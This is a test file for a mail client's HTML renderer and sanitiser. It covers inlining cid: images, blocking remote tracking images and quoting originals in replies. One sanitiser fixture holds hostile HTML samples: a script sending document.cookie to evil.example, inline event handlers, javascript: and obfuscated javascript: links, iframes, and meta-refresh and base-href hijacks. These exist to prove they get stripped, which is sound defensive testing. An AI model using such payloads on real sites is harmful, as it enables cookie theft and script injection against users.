// The reader's HTML pass, and the quoted original inside a reply.
//
// Two of these are security tests: the sanitiser fixture, and the assertion that a remote
// image is never loaded by default. The rest are correctness — an Outlook signature whose
// logo does not appear is the single most common "this thing is broken" report a mail reader
// gets, and cid: resolution is the whole of the fix.
import { test } from "node:test";
import assert from "node:assert/strict";
import {
  renderHtml, sanitizeHtml, inlineParts, quoteHtml, PIXEL, MAX_INLINE_BYTES, MAX_INLINE_TOTAL,
} from "../src/html-render.js";
import { b64Lines } from "../src/build-mime.js";

const crlf = (s) => s.replace(/\n/g, "\r\n");
const LOGO = "\x89PNG\r\n\x1a\nnot really a png, but bytes are bytes";

// A message shaped like the ones that make this necessary: Outlook's multipart/related, the
// signature logo as an inline part, the Content-ID in angle brackets and in a different case
// from the reference in the markup.
const RELATED = crlf(`From: Alice <alice@example.com>
To: support@example.com
Subject: with a signature
MIME-Version: 1.0
Content-Type: multipart/related; boundary="R1"

--R1
Content-Type: text/html; charset=utf-8

<p>Regards,<img src="cid:IMAGE001.PNG@01D9ABCD"></p>
--R1
Content-Type: image/png; name="logo.png"
Content-ID: <image001.png@01d9abcd>
Content-Location: https://cdn.example.com/logo.png
Content-Transfer-Encoding: base64
Content-Disposition: inline; filename="logo.png"

${b64Lines(LOGO)}
--R1--
`);

// b64Lines encodes the fixture as UTF-8, so that — byte for byte — is what the part holds and
// what the data: URI must come back as.
const EXPECTED_URI = `data:image/png;base64,${Buffer.from(LOGO, "utf8").toString("base64")}`;

// The part list without going through a raw message, so a cap test costs 2 MB of string and
// not 3 MB of base64 fixture. cte "" means the body IS the bytes (see mime.js decodeBody).
const fakePart = (cid, bytes, type = "image/png") =>
  ({ cid, location: "", filename: "", type, part: { cte: "", body: "x".repeat(bytes) } });

test("inlineParts finds what a cid: reference could point at, and ignores the rest", () => {
  const parts = inlineParts(RELATED);
  assert.equal(parts.length, 1, "the html part has no cid, no location and no filename");
  assert.equal(parts[0].cid, "image001.png@01d9abcd", "angle brackets stripped, lowercased");
  assert.equal(parts[0].location, "https://cdn.example.com/logo.png");
  assert.equal(parts[0].filename, "logo.png");
  assert.equal(parts[0].type, "image/png");
});

test("inlineParts takes the raw bytes as happily as the string", () => {
  const bytes = Uint8Array.from(RELATED, (c) => c.charCodeAt(0));
  assert.deepEqual(inlineParts(bytes).map((p) => p.cid), ["image001.png@01d9abcd"]);
  assert.deepEqual(inlineParts(null), []);
  assert.deepEqual(inlineParts(""), []);
});

test("a cid: image is inlined as a data: URI — angle brackets and case do not matter", () => {
  const r = renderHtml(`<p>Regards,<img src="cid:IMAGE001.PNG@01D9ABCD"></p>`, { parts: inlineParts(RELATED) });
  assert.equal(r.html, `<p>Regards,<img src="${EXPECTED_URI}"></p>`);
  assert.equal(r.remote_images, 0);
});

test("a cid: reference in angle brackets resolves too", () => {
  const r = renderHtml(`<img src="cid:<image001.png@01d9abcd>">`, { parts: inlineParts(RELATED) });
  assert.match(r.html, /src="data:image\/png;base64,/);
});

test("Content-Location and filename are the fallback when the Content-ID does not match", () => {
  const parts = inlineParts(RELATED);
  assert.match(renderHtml(`<img src="cid:https://cdn.example.com/logo.png">`, { parts }).html,
    /src="data:image\/png;base64,/, "by Content-Location");
  assert.match(renderHtml(`<img src="cid:LOGO.png">`, { parts }).html,
    /src="data:image\/png;base64,/, "by filename, case-insensitively");
});

test("a cid: that matches nothing is left exactly as it was", () => {
  const r = renderHtml(`<img src="cid:nothing@here">`, { parts: inlineParts(RELATED) });
  assert.equal(r.html, `<img src="cid:nothing@here">`);
});

test("one image over the per-image cap is left unresolved; a smaller one beside it is not", () => {
  const parts = [fakePart("big@x", MAX_INLINE_BYTES + 1), fakePart("small@x", 8)];
  const r = renderHtml(`<img src="cid:big@x"><img src="cid:small@x">`, { parts });
  assert.match(r.html, /<img src="cid:big@x">/, "over cap: the src stays a cid: and visibly does not load");
  assert.match(r.html, /<img src="data:image\/png;base64,eHh4eHh4eHg=">/, "under cap: inlined");
});

test("the total cap stops inlining once the budget is spent", () => {
  const each = MAX_INLINE_BYTES;
  assert.equal(MAX_INLINE_TOTAL, each * 3, "this test assumes three full-size images fill the budget");
  const parts = [fakePart("a@x", each), fakePart("b@x", each), fakePart("c@x", each), fakePart("d@x", 4)];
  const r = renderHtml(`<img src="cid:a@x"><img src="cid:b@x"><img src="cid:c@x"><img src="cid:d@x">`, { parts });
  assert.equal((r.html.match(/src="data:/g) || []).length, 3);
  assert.match(r.html, /<img src="cid:d@x">/, "the budget is spent, so the fourth stays unresolved");
});

test("the same cid twice costs the budget once", () => {
  const parts = [fakePart("a@x", MAX_INLINE_BYTES), fakePart("b@x", MAX_INLINE_BYTES),
    fakePart("c@x", MAX_INLINE_BYTES), fakePart("d@x", 4)];
  const r = renderHtml(`<img src="cid:a@x"><img src="cid:a@x"><img src="cid:b@x"><img src="cid:c@x"><img src="cid:d@x">`, { parts });
  assert.match(r.html, /<img src="cid:d@x">/);
  assert.equal((r.html.match(/src="data:/g) || []).length, 4, "a@x appears twice, paid for once");
});

test("url(cid:) in CSS is inlined too, in single quotes so it survives a style attribute", () => {
  const parts = inlineParts(RELATED);
  const r = renderHtml(`<div style="background:url(cid:image001.png@01d9abcd)">x</div>`, { parts });
  assert.equal(r.html, `<div style="background:url('${EXPECTED_URI}')">x</div>`);
  assert.match(renderHtml(`<style>b{background:url("cid:image001.png@01d9abcd")}</style>`, { parts }).html,
    /url\('data:image\/png;base64,/, "inside a <style> block as well");
});

test("a remote image is never loaded: the src is parked and counted", () => {
  const r = renderHtml(`<p><img src="https://tracker.example/open.gif" width="1" height="1" srcset="x 2x"></p>`);
  assert.equal(r.remote_images, 1);
  assert.match(r.html, /data-remote-src="https:\/\/tracker\.example\/open\.gif"/);
  assert.match(r.html, new RegExp(` src="${PIXEL.replace(/[.*+?^${}()|[\]\\/]/g, "\\$&")}"`));
  assert.equal(/srcset/.test(r.html), false, "srcset would override the placeholder");
  assert.equal((r.html.match(/data-remote-src/g) || []).length, 1,
    "one attribute, in exactly the spelling the reader undoes");
});

test("http, https and protocol-relative are all remote; cid: and data: are not", () => {
  assert.equal(renderHtml(`<img src="http://a/x.gif">`).remote_images, 1);
  assert.equal(renderHtml(`<img src="//a/x.gif">`).remote_images, 1);
  assert.equal(renderHtml(`<img src="data:image/gif;base64,AAA">`).remote_images, 0);
  assert.equal(renderHtml(`<img src="cid:x@y">`).remote_images, 0);
  assert.equal(renderHtml(`<img alt="no src at all">`).remote_images, 0);
});

test("the reader can undo the parking, exactly, with the two string replacements it uses", () => {
  const r = renderHtml(`<img src="https://a/x.gif" width="1">`);
  const restored = r.html.split(` src="${PIXEL}"`).join("").split("data-remote-src=").join("src=");
  assert.equal(restored, `<img src="https://a/x.gif" width="1">`);
});

test("the sanitiser: script, handlers, frames, plugins, base, meta http-equiv, javascript:", () => {
  const hostile = [
    "<p>visible text</p>",
    "<script>fetch('https://evil.example/'+document.cookie)</script>",
    '<img src="x" onerror="alert(1)">',
    '<div onload="alert(2)" ONCLICK=alert(3) data-keep="yes">handled</div>',
    '<iframe src="https://evil.example/"></iframe>',
    '<object data="evil.swf"></object><embed src="evil.swf">',
    '<a href="javascript:alert(4)">link</a>',
    '<a href="VBScript:alert(5)">link2</a>',
    '<a href="java&#115;cript:alert(6)">link3</a>',
    '<form action="https://evil.example/"><input name="x"></form>',
    '<meta http-equiv="refresh" content="0;url=https://evil.example/">',
    '<meta charset="utf-8">',
    '<base href="https://evil.example/">',
    '<div style="background:url(javascript:alert(7))">styled</div>',
    "<style>p{color:red}</style>",
  ].join("");
  const out = sanitizeHtml(hostile);
  for (const gone of ["<script", "</script", "fetch(", "onerror", "onload", "ONCLICK", "onclick",
    "<iframe", "<object", "<embed", "<form", "</form", "<base", "http-equiv", "javascript:", "VBScript:"])
    assert.equal(out.toLowerCase().includes(gone.toLowerCase()), false, `${gone} survived: ${out}`);
  assert.match(out, /<p>visible text<\/p>/, "the message itself survives");
  assert.match(out, /data-keep="yes"/, "an ordinary attribute is not collateral");
  assert.match(out, /<input name="x">/, "a form is unwrapped, not emptied");
  assert.match(out, /<meta charset="utf-8">/, "charset is not http-equiv and cannot redirect");
  assert.match(out, /<style>p\{color:red\}<\/style>/, "inline style is how mail is laid out");
  assert.match(out, /link<\/a>/, "the anchor keeps its text, loses its scheme");
});

test("an unterminated <script> takes the rest of the document with it", () => {
  // The browser would have done the same; leaving the tag and showing its contents as text
  // would be the surprising outcome, not this one.
  const out = sanitizeHtml("<p>before</p><script>alert(1)");
  assert.match(out, /<p>before<\/p>/);
  assert.equal(out.includes("alert"), false);
});

test("a > inside a quoted attribute does not end the tag", () => {
  // It comes back escaped, which is what it should have been in the first place.
  assert.equal(sanitizeHtml('<div title="a > b" onclick="x">t</div>'), '<div title="a &gt; b">t</div>');
});

test("closing tags, comments and the doctype pass through untouched", () => {
  const s = "<!doctype html><!-- a comment --><p>x</p>";
  assert.equal(sanitizeHtml(s), s);
});

test("the sanitiser leaves images alone — that is renderHtml's job, not its own", () => {
  const s = '<img src="cid:x@y"><img src="https://a/b.gif">';
  assert.equal(sanitizeHtml(s), s);
});

test("nothing at all is not an error", () => {
  assert.deepEqual(renderHtml(null), { html: "", remote_images: 0 });
  assert.deepEqual(renderHtml(""), { html: "", remote_images: 0 });
});

// ---- the quoted original in a reply ------------------------------------

const ORIGINAL = '<p>the original</p><img src="cid:image001.png@01d9abcd">' +
  '<img src="https://cdn.example.com/hero.png"><script>alert(1)</script>' +
  '<div style="background:url(cid:image001.png@01d9abcd)">x</div>';

test("the reply quote is the author's text, the attribution, then the original blockquoted", () => {
  const q = quoteHtml("my answer", { date: "Tue, 9 Sep 2026 10:00:00 +0300", from: "Alice <alice@example.com>", html: ORIGINAL });
  assert.match(q, /^<div style="white-space:pre-wrap;font-family:inherit">my answer<\/div><br>/);
  assert.match(q, /<div>On Tue, 9 Sep 2026 10:00:00 \+0300, Alice &lt;alice@example\.com&gt; wrote:<\/div>/);
  assert.match(q, /<blockquote type="cite" style="border-left:2px solid #ccc;margin:0 0 0 \.8ex;padding-left:1ex">/);
  assert.match(q, /<p>the original<\/p>/);
  assert.match(q, /<\/blockquote>$/);
});

test("the reply text is escaped, never interpreted", () => {
  const q = quoteHtml('<script>alert(1)</script> & "quotes"', { from: "a@b.co", html: "<p>x</p>" });
  assert.match(q, /&lt;script&gt;alert\(1\)&lt;\/script&gt; &amp; &quot;quotes&quot;/);
  assert.equal(/<script>/.test(q), false);
});

test("cid: images are REMOVED from the quote, never inlined", () => {
  // A reply that carries the sender's signature logos back to them is 2 MB of their own
  // artwork, and a cid: that points into the message being quoted resolves to nothing.
  const q = quoteHtml("answer", { from: "a@b.co", html: ORIGINAL });
  assert.equal(/cid:/.test(q), false, "no dangling cid: reference either");
  assert.equal(/data:image/.test(q), false, "and nothing inlined in its place");
  assert.match(q, /background:none/, "a cid: background becomes no background");
});

test("remote images in the quote are left as the original had them", () => {
  const q = quoteHtml("answer", { from: "a@b.co", html: ORIGINAL });
  assert.match(q, /<img src="https:\/\/cdn\.example\.com\/hero\.png">/);
  assert.equal(/data-remote-src/.test(q), false, "the recipient's own client decides");
});

test("the sanitiser applies inside the quote — there is no sandbox in a mail client", () => {
  const q = quoteHtml("answer", { from: "a@b.co", html: ORIGINAL + '<div onclick="x()">c</div>' });
  assert.equal(/<script|onclick|alert\(/.test(q), false);
});

test("a <style> block is dropped from the quote, though the reader keeps it", () => {
  // A style block is document-wide wherever the recipient's client honours it, so the
  // original's CSS would restyle the reply written above it. The reader's iframe contains
  // nothing else, so there it stays: this is the one place the two passes differ.
  const original = '<style>body{display:none}p{color:#fff}</style><p style="color:#a00">the original</p>';
  const q = quoteHtml("answer", { from: "a@b.co", html: original });
  assert.equal(/<style|display:none/.test(q), false, "the original's stylesheet must not reach the reply");
  assert.match(q, /<p style="color:#a00">the original<\/p>/, "an inline style= is scoped to its element and stays");
  assert.match(renderHtml(original).html, /<style>body\{display:none\}p\{color:#fff\}<\/style>/,
    "the reader keeps it: its iframe contains nothing else to restyle");
});

test("no date means no 'On <nothing>,' — the same sentence the text quote writes", () => {
  assert.match(quoteHtml("a", { from: "Alice <a@b.co>", html: "<p>x</p>" }), /<div>Alice &lt;a@b\.co&gt; wrote:<\/div>/);
  assert.match(quoteHtml("a", { html: "<p>x</p>" }), /<div>someone wrote:<\/div>/);
});
